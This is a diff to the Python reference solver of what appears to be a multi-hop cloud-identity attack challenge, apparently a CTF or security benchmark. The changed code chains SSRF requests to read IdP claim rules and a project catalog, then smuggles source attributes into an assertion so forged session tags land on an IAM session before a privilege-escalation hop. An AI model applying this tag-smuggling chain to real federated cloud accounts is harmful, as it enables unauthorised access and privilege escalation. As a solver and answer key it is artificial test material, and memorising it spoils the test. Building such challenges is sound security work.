@@ -114,33 +114,49 @@ def solve(base: str, echo=print, state: dict = None) -> str:
     family = desc.get("escalation_family")
     fed_family = desc.get("federation_family", "principal-tag")
 
-    def find_condition(d):
+    def find_conditions(d):
+        """Return ALL {tag_key: value} pairs from every trust-condition StringEquals in the tree.
+        (baseline has 1 pair; two_tag has 2 — the second describes an env attribute.)"""
+        out = {}
         if isinstance(d, dict):
             se = d.get("Condition", {}).get("StringEquals") if "Condition" in d else None
             if se:
-                k = next(iter(se))
-                return k.split("/")[-1], se[k]
+                for k, v in se.items():
+                    out[k.split("/")[-1]] = v
             for v in d.values():
-                r = find_condition(v)
-                if r:
-                    return r
-        return None
+                for kk, vv in find_conditions(v).items():
+                    out.setdefault(kk, vv)
+        return out
 
-    tag_name, _ = find_condition(desc)
-    # (a) INJECTION POINT: which caller source attribute does the IdP claim rule map to the honored tag?
-    rules = ssrf(f"{IDP}/idp/claim-rules")["rules"]
-    source_attr = next(r["source"] for r in rules if r["emits_tag"] == tag_name)
-    # (b) VALUE: the project_code of the project owned by the entitled group's team (correlate the catalog)
+    conds = find_conditions(desc)
+    # Baseline: single project tag. two_tag: adds an env tag (name = whatever the trust policy lists).
+    # `required_keys` on tag_source is authoritative under two_tag; fall back to condition keys.
+    required_keys = list((desc.get("session_tag_source") or {}).get("required_keys") or list(conds.keys()))
+    # Pick project vs env keys deterministically. The project tag is the one whose condition value
+    # mentions "project_code"; the env tag is any other required key (empirically the env tag names
+    # come from a distinct pool — "environment", "deployment-stage", etc. — never "project_code").
+    project_tag = next(k for k in required_keys if "project_code" in (conds.get(k) or ""))
+    env_tag = next((k for k in required_keys if k != project_tag), None)
+    # Correlate the directory catalog: single project whose owner_team matches the trust predicate.
     projects = ssrf(f"{DIR}/dir/projects")["projects"]
-    tag_value = next(p["project_code"] for p in projects if p["owner_team"] == owner_team)
-    # (c) inject the SOURCE attribute; the IdP claim rule emits it as the honored tag (its value is ours)
-    smug = {"entitlement": ent, "role": granted_role, "attributes": {source_attr: tag_value}}
+    winning = next(p for p in projects if p["owner_team"] == owner_team)
+    tag_value = winning["project_code"]
+    # (a) INJECTION POINT: which caller source attribute does each IdP claim rule map to?
+    rules = ssrf(f"{IDP}/idp/claim-rules")["rules"]
+    source_attr = next(r["source"] for r in rules if r["emits_tag"] == project_tag)
+    attrs = {source_attr: tag_value}
+    env_value = None
+    if env_tag is not None:  # two_tag active — inject BOTH source attributes
+        env_source_attr = next(r["source"] for r in rules if r["emits_tag"] == env_tag)
+        env_value = winning.get("environment")  # dependent lookup on the same winning project record
+        attrs[env_source_attr] = env_value
+    smug = {"entitlement": ent, "role": granted_role, "attributes": attrs}
     a1 = ssrf(f"{IDP}/idp/assert?p={b64u(smug)}")
     sess1_resp = ssrf(f"{IAM}/iam/session?assertion={a1['assertion']}")
-    marker(sess1_resp)  # h4 — credited ONLY here, when the smuggled tag actually lands on the session
+    marker(sess1_resp)  # h4 — credited ONLY here, when the smuggled tag(s) actually land on the session
     sess1 = sess1_resp["session"]
-    st.update(tag_name=tag_name, tag_value=tag_value, family=family,
-              fed_family=fed_family, bootstrap_session=sess0, tagged_session=sess1)
+    st.update(tag_name=project_tag, tag_value=tag_value, env_tag=env_tag, env_value=env_value,
+              family=family, fed_family=fed_family, bootstrap_session=sess0, tagged_session=sess1)
 
     # ---- hop 5: cloud IAM privesc — mechanism depends on the discovered family -----------------
     caps = ssrf(f"{DEP}/deploy/capabilities")
